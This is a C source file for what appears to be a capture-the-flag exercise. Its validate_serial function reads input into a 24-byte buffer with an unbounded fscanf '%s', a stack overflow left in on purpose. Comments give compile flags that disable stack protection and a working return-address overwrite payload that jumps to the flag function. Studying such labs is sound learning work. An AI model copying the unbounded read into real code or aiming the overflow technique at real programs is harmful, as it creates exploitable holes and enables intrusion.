#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int validate_serial(){
    char serial[24];
    fscanf( stdin, "%s", serial);
    return 0;
}

//how to get to this point if validate_serial always returns false?
int do_valid_stuff(){
    printf("Flag!\n");
}

int main( int argc, char *argv[]){
    if(validate_serial()){
        do_valid_stuff();
    }
    else{
        printf("Invalid serial number!\n");
    }
}

// gcc -mpreferred-stack-boundary=2 -ggdb -g -fno-stack-protector auth.c -o auth
// 0x804848b: validate serial
// \x8b\x84\x04\x08
// return address for the function 0x080484ca
// want to force the program to go to do_valid_stuff instead of the invalid stuff!
// AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08
// printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xce\x84\x04\x08" | ./auth is a working exploit



/*
What was needed in order to solve this challenge?
-Understanding of how stack and assembly works.
-gcc with specific flags
-gdb: x/20x $ebp, disas func, break *0xaddress, continue, run.
-printf in command line
-wc

*/
